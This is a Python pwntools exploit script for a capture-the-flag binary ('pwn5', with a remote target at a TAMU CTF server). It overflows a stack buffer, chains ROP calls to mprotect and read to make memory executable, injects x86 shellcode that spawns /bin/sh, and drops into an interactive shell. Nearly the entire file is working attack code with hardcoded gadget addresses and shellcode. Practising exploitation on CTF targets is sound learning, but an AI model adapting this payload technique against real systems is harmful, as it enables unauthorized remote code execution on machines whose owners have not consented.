#!/usr/bin/env python
import pwn
import time
import sys


# Constants
BUFFERSIZE = 32
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
OVERFLOW = "A" * BUFFERSIZE
NAV_INTERFACE = "Jacob\nKilpatrick\nEE\ny\n2"

# ROP Addresses
rwx = 0x080ef000
pop3ret = 0x80483e8
mprotect = 0x8072450
read = 0x8071950
exit = 0x804e670

def usage():
    print "Usage: %s [FLAGS]" % sys.argv[0]
    print "\nFLAG\t\t\tOption"
    print "-l\t\t\tLocal (Default)"
    print "-r\t\t\tRemote\n"
    return

def setup(argv = ""):
    #Local Exploit
    if argv == "-l" or argv == "":
        r = pwn.process("./pwn5")
    #Remote Exploit
    elif argv == "-r":
        r = pwn.remote("pwn.ctf.tamu.edu", 4325)
    else:
        usage()
        return
    #Build Payload and EXPLOIT!!!
    exploit(r, buildPayload())

def buildPayload():
    # Build payload
    # Overflow the stack
    payload = ""
    payload += OVERFLOW			# Add overflow of 'A'

    # First ROP hop to set rwx memory as read write and exec
    payload += pwn.p32(mprotect)	# Call mprotect
    payload += pwn.p32(pop3ret)		# pop pop pop ret to clear stack
    payload += pwn.p32(rwx)		# 1st arg: Location of memory to edit
    payload += pwn.p32(0x1000)		# 2nd arg: Size of memory
    payload += pwn.p32(0x7)		# 3rd arg: 7 = Read/Write/Exec

    # Second ROP hop to read in Shellcode from stdin
    payload += pwn.p32(read)		# Call read
    payload += pwn.p32(rwx)		# After read call rwx memory where our shellcode is
    payload += pwn.p32(0x0)		# fd = STDIN
    payload += pwn.p32(rwx)		# Location to save shellcode
    payload += pwn.p32(0x32)		# Num bytes to read
    return(payload)

def exploit(r, payload):
    r.sendline(NAV_INTERFACE)		#Navigate Program interface
    r.sendline(payload)			#Send our payload (stackoverflow and ROPChain)
    #r.recvuntil(" EE")			#This doesn't work because of TAMU output buffer error
    time.sleep(2)			#So we just wait 2 seconds instead
    r.sendline(SHELLCODE)		#Send our shell code to get shell
    r.interactive()			#Keep the shell alive

if __name__ == "__main__":
    if len(sys.argv) > 2:
        usage()
    elif len(sys.argv) == 2:
        setup(sys.argv[1])
    else:
        setup()
